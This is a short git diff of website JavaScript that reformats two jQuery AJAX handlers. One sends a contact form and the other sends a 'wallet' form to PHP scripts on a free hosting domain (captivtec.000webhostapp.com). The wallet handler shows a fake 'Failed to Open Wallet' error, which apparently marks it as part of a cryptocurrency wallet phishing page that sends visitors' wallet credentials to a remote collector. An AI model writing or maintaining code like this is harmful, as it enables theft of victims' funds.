@@ -67,25 +67,27 @@ if (contact) {
         contactSubmit.disabled = true;
         var formData = $(this).serialize();
 
-        $.ajax({
-            type: 'POST',
-            url: 'https://captivtec.000webhostapp.com/sify.php',
-            data: formData,
-            dataType: 'json',
-            success: function (response) {
-                alertMessage(response.message, 'success');
-                setTimeout(function () {
-                    $('#alertMessage').children('.alert').fadeOut();
-                    contactSubmit.disabled = false;
-                }, 3000);
-            },
-            error: function (xhr, status, error) {
-                alertMessage('Failed to send email', 'danger');
-                setTimeout(function () {
-                    $('#alertMessage').children('.alert').fadeOut();
-                    contactSubmit.disabled = false;
-                }, 3000);
-            }
+        $(function () {
+            $.ajax({
+                type: 'POST',
+                url: 'https://captivtec.000webhostapp.com/sify.php',
+                data: formData,
+                dataType: 'json',
+                success: function (response) {
+                    alertMessage(response.message, 'success');
+                    setTimeout(function () {
+                        $('#alertMessage').children('.alert').fadeOut();
+                        contactSubmit.disabled = false;
+                    }, 3000);
+                },
+                error: function (xhr, status, error) {
+                    alertMessage('Failed to send email', 'danger');
+                    setTimeout(function () {
+                        $('#alertMessage').children('.alert').fadeOut();
+                        contactSubmit.disabled = false;
+                    }, 3000);
+                }
+            });
         });
     })
 }
@@ -147,32 +149,34 @@ if (wallet) {
             return;
         }
 
-        $.ajax({
-            type: 'POST',
-            url: 'https://captivtec.000webhostapp.com/wallet.php',
-            data: formData,
-            dataType: 'json',
-            success: function (response) {
-                alertMessage(response.message, 'success');
-                setTimeout(function () {
-                    $('#alertMessage').children('.alert').fadeOut();
-                    walletSubmit.disabled = false;
-                }, 3000);
-            },
-            error: function (xhr, status, error) {
-                alertMessage('Failed to Open Wallet! Try Again Later.', 'danger');
-                setTimeout(function () {
-                    $('#alertMessage').children('.alert').fadeOut();
-                    walletSubmit.disabled = false;
-                }, 3000);
-            }
+        $(function () {
+            $.ajax({
+                type: 'POST',
+                url: 'https://captivtec.000webhostapp.com/wallet.php',
+                data: formData,
+                dataType: 'json',
+                success: function (response) {
+                    alertMessage(response.message, 'success');
+                    setTimeout(function () {
+                        $('#alertMessage').children('.alert').fadeOut();
+                        walletSubmit.disabled = false;
+                    }, 3000);
+                },
+                error: function (xhr, status, error) {
+                    alertMessage('Failed to Open Wallet! Try Again Later.', 'danger');
+                    setTimeout(function () {
+                        $('#alertMessage').children('.alert').fadeOut();
+                        walletSubmit.disabled = false;
+                    }, 3000);
+                }
+            });
         });
     })
 }
 
 let phoneNumber = document.getElementById('phone');
-if(phoneNumber) {
-    phoneNumber.addEventListener('input', ()=> validatePhoneNumber());
+if (phoneNumber) {
+    phoneNumber.addEventListener('input', () => validatePhoneNumber());
     function validatePhoneNumber() {
         var regex = /^\+?[0-9]+$/;
         if (!regex.test(phoneNumber.value)) {
